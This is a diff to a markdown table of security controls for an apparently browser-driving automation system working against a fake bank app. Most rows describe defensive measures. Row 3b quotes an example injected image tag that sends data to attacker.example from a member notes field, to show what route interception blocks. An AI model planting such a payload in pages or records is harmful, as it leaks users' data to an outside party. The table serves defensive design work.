@@ -6,7 +6,7 @@ Terms in [CONTEXT.md](../CONTEXT.md). The principle: arrange things so the dange
 
 | # | Control | Where it lives | Status |
 |---|---|---|---|
-| 1 | **BUILT** — **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | `fake_bank/data.py`, `cua/engine.py` (EnvSecrets per service account) |
+| 1 | **BUILT** — **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | `fake_bank/data.py`, `cua/secrets.py` (EnvSecrets per service account) |
 | 2 | **BUILT** — **Capability by construction.** The Replay Engine implements a closed action vocabulary; `download`, `execute_script`, `open_new_tab` have no implementation, so no Artifact can express them. | `cua/artifact.py` closed vocabularies |
 | 3 | **BUILT** — **Browser hardening.** Downloads off, popups and new tabs closed and logged, file chooser disabled, permissions denied, JS dialogs dismissed, a fresh context per run so no cookie crosses Tenants. | `cua/surface.py` |
 | 3b | **BUILT** — **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | `cua/surface.py` `_gate` |
